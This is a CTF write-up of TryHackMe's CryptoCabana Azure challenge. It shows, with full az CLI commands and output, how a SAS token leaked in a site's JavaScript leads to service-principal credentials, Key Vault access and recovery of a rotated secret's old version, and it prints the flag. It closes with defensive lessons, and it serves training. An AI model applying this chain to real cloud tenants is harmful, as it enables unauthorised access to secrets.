# CryptoCabana | TryHackMe Hacker Holidays 2026 – Day 9 Write-up

## Room Information

| Category           | Details                                                                                                                             |
| ------------------ | ----------------------------------------------------------------------------------------------------------------------------------- |
| **Room**           | CryptoCabana                                                                                                                        |
| **Series**         | Hacker Holidays 2026                                                                                                                |
| **Day**            | Day 9                                                                                                                               |
| **Category**       | Cloud                                                                                                                               |
| **Platform**       | TryHackMe                                                                                                                           |
| **Cloud Provider** | Microsoft Azure                                                                                                                     |
| **Services Used**  | Azure Storage, Azure Key Vault, Azure CLI                                                                                           |
| **Skills Covered** | Azure Storage enumeration, SAS token abuse, service principal authentication, Key Vault secret enumeration, secret version recovery |

---

## Overview

CryptoCabana is an Azure cloud-security challenge that demonstrates how several small cloud security misconfigurations can be chained together to expose sensitive information.

The challenge begins with a public cryptocurrency seed-phrase backup kiosk. Although the website claims that backups are private and secure, its client-side JavaScript exposes a long-lived Azure Storage Shared Access Signature (SAS) token.

The exposed SAS token provides more access than the application requires. It allows unauthenticated users to enumerate storage containers and read blobs across the storage account. This leads to a hidden container containing Azure service-principal credentials.

After authenticating with the leaked service principal, Azure Key Vault can be enumerated. The final flag is split across three Key Vault secrets. One of the secret values has been rotated, but the previous version remains accessible. Recovering the older secret version reveals the missing flag fragment.

---

## Concierge Briefing

> By the time he made it back from the breakfast buffet, his wallet had already moved on without him. The transaction was signed, properly signed, just not by him.
>
> He'd backed his seed phrase up weeks ago, into the CryptoCabana kiosk's vault — the one whose landing page promised:
>
> **“Backed up. Sleep easy.”**
>
> Somewhere between that promise and this morning, something else got a good look at what was supposed to stay behind glass.
>
> **Objective:** Find out what the kiosk is trusting to access storage and determine how far that trust extends.

---

## Initial Access

The room provides Azure Portal credentials and access to Azure Cloud Shell.

After opening **Azure Cloud Shell**, I selected:

* **Shell:** Bash
* **Storage:** No storage account required
* **Subscription:** `Az-Subs-CTF`

I verified the active Azure account using:

```bash
az account show
```

The output confirmed that the correct subscription was active:

```json
{
  "name": "Az-Subs-CTF",
  "state": "Enabled",
  "user": {
    "name": "usr-08040156@thmctf.onmicrosoft.com",
    "type": "user"
  }
}
```

<img width="689" height="233" alt="image" src="https://github.com/user-attachments/assets/cf116fcf-b420-4886-8020-29ec4bb23de4" />


---

# Step 1: Inspecting the CryptoCabana Website

The target website was:

```text
https://cryptocabanaf5scjagc.z13.web.core.windows.net/
```

I downloaded the website's HTML source using:

```bash
curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/ -o index.html
```

I then displayed the source:

```bash
cat index.html
```

The HTML contained the CryptoCabana interface and referenced an external JavaScript file:

```html
<script src="app.js"></script>
```

This indicated that the application's logic and configuration were stored in `app.js`.

<img width="443" height="49" alt="image" src="https://github.com/user-attachments/assets/d7ab7611-d0ae-479d-8ca6-c0ea6d1c6232" />




---

# Step 2: Discovering the Exposed Azure Storage SAS Token

I downloaded the JavaScript file:

```bash
curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/app.js -o app.js
```

I then viewed its contents:

```bash
cat app.js
```

The JavaScript exposed the following Azure Storage configuration:

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";

const BACKUP_SAS =
"?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=REDACTED";
```

The application used the SAS token to upload seed phrases to Azure Blob Storage.

The exposed token contained the following permissions:

```text
sp=rl
```

These permissions represent:

| Permission | Meaning    |
| ---------- | ---------- |
| `r`        | Read blobs |
| `l`        | List blobs |

The SAS token also included:

```text
ss=b
```

This indicates access to the **Azure Blob service**.

The resource type field was:

```text
srt=sco
```

This grants access to:

* Service-level resources
* Container-level resources
* Object-level resources

The token was also configured with an extremely long expiration date:

```text
se=2099-12-31T23:59:59Z
```

This meant that anyone visiting the public website could obtain a long-lived SAS token capable of reading and listing resources across the storage account.

<img width="959" height="71" alt="image" src="https://github.com/user-attachments/assets/733af10a-4be7-4f8b-90f2-5d1c9ae132e7" />

---

# Step 3: Enumerating Azure Storage Containers

The application only referenced the `backups` container. However, because the SAS token had service and container-level listing permissions, I attempted to enumerate all containers in the storage account.

I ran:

```bash
az storage container list \
  --account-name cryptocabanaf5scjagc \
  --sas-token 'REDACTED' \
  --output table
```

The following containers were discovered:

```text
Name
-------
$web
backups
vault
```

The `vault` container was not referenced anywhere in the public website.

This matched the challenge clue:

> “Follow that trust somewhere the kiosk's own page never once points you.”

<img width="959" height="148" alt="image" src="https://github.com/user-attachments/assets/db1c664c-8f63-4acc-84e2-03eacb0f3e70" />


---

# Step 4: Enumerating the Hidden `vault` Container

I listed the blobs inside the hidden `vault` container:

```bash
az storage blob list \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --sas-token 'REDACTED' \
  --output table
```

The output revealed two files:

```text
Name
---------------------------
backup-service-account.json
seed_phrase.txt
```

The file named `backup-service-account.json` appeared to contain Azure credentials.

<img width="959" height="143" alt="image" src="https://github.com/user-attachments/assets/c4bd184b-5270-4d5c-a2e3-749eac7d0bdc" />


---

# Step 5: Downloading the Leaked Service-Principal Credentials

I downloaded the service-account file:

```bash
az storage blob download \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --name backup-service-account.json \
  --file backup-service-account.json \
  --sas-token 'REDACTED'
```

I then displayed its contents:

```bash
cat backup-service-account.json
```

The file contained:

```json
{
  "client_id": "REDACTED",
  "client_secret": "REDACTED",
  "key_vault_name": "ccabana-kv-f5scjagc",
  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT",
  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
}
```

The file exposed:

* An Azure application/client ID
* A service-principal client secret
* The Azure tenant ID
* The name and URI of the Azure Key Vault

The note warned that the credentials should be rotated if they ever left the vault. However, the credentials were stored in a blob accessible through the publicly exposed SAS token.

<img width="959" height="56" alt="image" src="https://github.com/user-attachments/assets/2be913c4-6192-431f-8739-7456d76ced9d" />


---

# Step 6: Authenticating as the Azure Service Principal

Using the credentials from the JSON file, I authenticated to Azure as the CryptoCabana backup automation service principal:

```bash
az login \
  --service-principal \
  --username "<CLIENT_ID>" \
  --password "<CLIENT_SECRET>" \
  --tenant "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
```

I verified the active identity:

```bash
az account show
```

The output showed:

```json
{
  "name": "Az-Subs-CTF",
  "user": {
    "name": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
    "type": "servicePrincipal"
  }
}
```

This confirmed that I had successfully authenticated as the leaked service principal.



---

# Step 7: Enumerating Azure Key Vault Secrets

The leaked credentials identified the Key Vault as:

```text
ccabana-kv-f5scjagc
```

I listed the available secrets:

```bash
az keyvault secret list \
  --vault-name ccabana-kv-f5scjagc \
  --output table
```

The following secrets were discovered:

```text
key-shard-1
key-shard-2
key-shard-3
master-key
```

<img width="959" height="128" alt="image" src="https://github.com/user-attachments/assets/2e9c03b6-ef38-4ace-b707-8c678f6d14b8" />


---

# Step 8: Retrieving the Available Key Shards

I retrieved the first key shard:

```bash
az keyvault secret show \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-1 \
  --query value \
  --output tsv
```

Output:

```text
THM{n0t_ur
```

I retrieved the second key shard:

```bash
az keyvault secret show \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 \
  --query value \
  --output tsv
```

Output:

```text
Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.
```

The second shard had been replaced with a message indicating that its previous value could still be recovered.

I retrieved the third key shard:

```bash
az keyvault secret show \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-3 \
  --query value \
  --output tsv
```

Output:

```text
ur_c01ns!}
```

<img width="917" height="247" alt="image" src="https://github.com/user-attachments/assets/9703a7e3-9ae8-473a-b965-ecd8fe9fd43e" />


---

# Step 9: Attempting to Retrieve `master-key`

I attempted to retrieve the `master-key`:

```bash
az keyvault secret show \
  --vault-name ccabana-kv-f5scjagc \
  --name master-key \
  --query value \
  --output tsv
```

The request was denied:

```text
(Forbidden) Caller is not authorized to perform action on resource.

Code: Forbidden
Inner error:
{
    "code": "ForbiddenByRbac"
}
```

The service principal was allowed to list the secret but did not have permission to retrieve its value.

This demonstrated that Azure permissions can differ between:

* Listing secret metadata
* Reading secret values

The `master-key` was therefore not required to complete the challenge.

<img width="959" height="329" alt="image" src="https://github.com/user-attachments/assets/3de1f01c-c347-4457-8ebf-d57481b8c88e" />


---

# Step 10: Enumerating Previous Versions of `key-shard-2`

The @0xMia clue stated:

> “if a value looks freshly rotated, ask yourself what it looked like five minutes before that 👀”

Since the current value of `key-shard-2` was a rotation message, I enumerated its previous versions:

```bash
az keyvault secret list-versions \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 \
  --query "[].{Version:id,Created:attributes.created,Updated:attributes.updated,Enabled:attributes.enabled}" \
  --output table
```

Two versions were returned:

```text
Version                                                          Created
---------------------------------------------------------------  -------------------------
3d6492d2c6f74123bc754a9ded22b2a0                                 2026-07-28T01:05:05+00:00
c922c422ffb34671a902389c372314f1                                 2026-07-28T01:05:07+00:00
```

The first version was older and was created two seconds before the newer version.

<img width="959" height="188" alt="image" src="https://github.com/user-attachments/assets/5901a022-8428-482f-ba79-d0e4459b765b" />


---

# Step 11: Recovering the Old Secret Value

I retrieved the older version of `key-shard-2`:

```bash
az keyvault secret show \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 \
  --version 3d6492d2c6f74123bc754a9ded22b2a0 \
  --query value \
  --output tsv
```

The old value was:

```text
_k3ys_n0t_
```

<img width="959" height="95" alt="image" src="https://github.com/user-attachments/assets/b2f0c539-95f0-489c-aca8-f22033f9ed51" />


---

# Step 12: Reconstructing the Flag

The three flag fragments were:

```text
Key Shard 1:
THM{n0t_ur

Key Shard 2:
_k3ys_n0t_

Key Shard 3:
ur_c01ns!}
```

Combining the fragments produced the final flag:

```text
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```

<img width="959" height="299" alt="image" src="https://github.com/user-attachments/assets/2eb3de34-5f29-4923-92b5-2feda7a550c5" />


---

# Final Flag

```text
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```

---

# Attack Chain Summary

```text
Public CryptoCabana Website
            │
            ▼
Exposed Azure Storage SAS Token
            │
            ▼
Enumerated All Storage Containers
            │
            ▼
Discovered Hidden `vault` Container
            │
            ▼
Downloaded `backup-service-account.json`
            │
            ▼
Recovered Azure Service-Principal Credentials
            │
            ▼
Authenticated to Azure as the Service Principal
            │
            ▼
Enumerated Azure Key Vault Secrets
            │
            ▼
Retrieved Key Shards 1 and 3
            │
            ▼
Identified Rotated `key-shard-2`
            │
            ▼
Enumerated Previous Secret Versions
            │
            ▼
Recovered the Old Key-Shard Value
            │
            ▼
Reconstructed the Final Flag
```

---

# Key Security Lessons

## 1. Do Not Expose SAS Tokens in Client-Side Code

The Azure Storage SAS token was embedded directly in a public JavaScript file.

Anyone who visited the website could retrieve the token and use its permissions.

Sensitive access tokens should not be embedded in:

* Public JavaScript files
* HTML source code
* Mobile application packages
* Public repositories

---

## 2. Apply the Principle of Least Privilege

The application only needed to upload backups to the `backups` container.

However, the exposed SAS token allowed read and list operations across the storage account. This made it possible to discover and access the hidden `vault` container.

A SAS token should be restricted to:

* The minimum required permissions
* A specific container or object
* A short expiration period
* Only the required resource types

---

## 3. Avoid Long-Lived SAS Tokens

The exposed token was valid until:

```text
2099-12-31
```

Long-lived credentials increase the impact of accidental exposure.

Short-lived tokens should be used wherever possible.

---

## 4. Never Store Service-Principal Secrets in Accessible Storage

The `backup-service-account.json` file contained a client ID and client secret.

Once the file was exposed, an attacker could authenticate as the backup automation service principal.

Service-principal credentials should be protected using:

* Azure Managed Identities
* Azure Key Vault
* Secure CI/CD secret stores
* Strict access controls

---

## 5. Secret Rotation Does Not Automatically Remove Old Versions

The current value of `key-shard-2` had been replaced, but the older version remained accessible.

Rotating a secret changes the current version but does not necessarily remove historical versions.

Organizations should review:

* Secret version retention
* Access permissions for older versions
* Secret lifecycle policies
* Whether compromised secret versions should be disabled or deleted

---

## 6. Separate Permissions for Listing and Reading

The service principal could list the `master-key` but could not retrieve its value.

This demonstrates that Azure RBAC permissions can be granular and should be reviewed carefully.

---

# Conclusion

CryptoCabana demonstrated how cloud misconfigurations can be chained together.

A publicly exposed Azure Storage SAS token allowed access beyond the intended `backups` container. That access exposed service-principal credentials stored in a hidden storage container. The leaked credentials provided access to Azure Key Vault, where an older version of a rotated secret contained the missing flag fragment.

The challenge reinforced the importance of:

* Protecting SAS tokens
* Using short-lived credentials
* Applying least privilege
* Avoiding exposed service-principal secrets
* Reviewing Azure Key Vault secret versions
* Using managed identities where possible

A single exposed cloud credential can become significantly more dangerous when combined with excessive permissions and insecure secret storage.
